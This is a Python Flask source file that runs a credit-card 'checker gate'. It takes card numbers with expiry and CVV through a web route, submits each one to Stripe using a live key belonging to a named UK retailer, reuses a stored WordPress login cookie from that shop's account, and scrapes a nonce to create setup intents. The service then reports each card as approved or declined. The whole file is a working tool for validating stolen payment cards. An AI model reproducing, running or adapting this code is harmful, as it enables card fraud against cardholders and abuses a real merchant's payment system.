from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent
import re

app = Flask(__name__)

def process_card(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {"response": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Invalid"}
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    
    # Step 1: Create Payment Method
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/ba4e3767a2; stripe-js-v3/ba4e3767a2; payment-element; deferred-intent',
        'referrer': 'https://mmbluxury.co.uk',
        'key': 'pk_live_51QN3COFLvZOyfPGe2MHhKIHsohoTIs7c9XRslXhmlRw2TH1erVyRjCiAQvekDN3aryQVXRFerkuh3WjzYzelSNKd00ZB7UtjcG',
    }
    
    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            }
        )
        
        if 'id' not in pm_response.json():
            error_msg = pm_response.json().get('error', {}).get('message', 'Payment Method Error')
            return {"response": error_msg, "status": "Declined"}
            
        payment_method_id = pm_response.json()['id']
    except Exception as e:
        return {"response": str(e), "status": "Error"}

    # Step 2: Get Nonce
    cookies = {
        'return_user': 'yes',
        '_fbp': 'fb.2.1748492273838.777832142325543057',
        '__stripe_mid': '9fb2b77d-db16-48dd-a007-744c98b7c6070a85b8',
        'sbjs_migrations': '1418474375998%3D1',
        'wordpress_logged_in_75c9f6091cede3871ec7c2a48972aa57': 'fafopel145%7C1749716814%7CECr9ZM8OnMnRjEgwUBU37bc29S3WzGk0rC3ltWMVFMM%7Cc4d78d5c7cc0d691e0966ac83432470b3060fdea43e896e856c7154b47cae490',
        '__stripe_sid': '8fae48d6-6ec6-4108-b36e-9834ad48fe27bcfc36',
    }
    
    headers = {
        'User-Agent': user_agent,
        'Referer': 'https://mmbluxury.co.uk/my-account/add-payment-method/',
    }
    
    try:
        nonce_response = requests.get(
            'https://mmbluxury.co.uk/my-account/add-payment-method/',
            cookies=cookies,
            headers=headers
        )
        
        nonce = None
        script_matches = re.findall(r'var\s+wc_stripe_params\s*=\s*({.*?});', nonce_response.text, re.DOTALL)
        if script_matches:
            try:
                import json
                params = json.loads(script_matches[0])
                nonce = params.get('createAndConfirmSetupIntentNonce')
            except:
                pass
        
        if not nonce:
            if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
                nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
            else:
                return {"response": "Failed to extract nonce", "status": "Error"}
    except Exception as e:
        return {"response": str(e), "status": "Error"}

    # Step 3: Create Setup Intent
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    
    try:
        setup_response = requests.post(
            'https://mmbluxury.co.uk/',
            params=params,
            cookies=cookies,
            headers={
                'User-Agent': user_agent,
                'Referer': 'https://mmbluxury.co.uk/my-account/add-payment-method/',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            },
            data=data
        )
        
        response_data = setup_response.json()
        if response_data.get('success'):
            status = response_data.get('data', {}).get('status', 'Approved')
            if status == 'requires_action':
                return {"response": "requires_action", "status": "Approved"}
            return {"response": "Succeed", "status": "Approved"}
        else:
            error_msg = response_data.get('data', {}).get('error', {}).get('message', 'Your card was declined')
            return {"response": error_msg, "status": "Declined"}
    except Exception as e:
        return {"response": str(e), "status": "Error"}

@app.route('/gate=stripe5/key=wasdark/cc=<cc>', methods=['GET'])
def check_card(cc):
    result = process_card(cc)
    response = {
        "cc": cc,
        "response": result["response"],
        "status": result["status"]
    }
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5698)
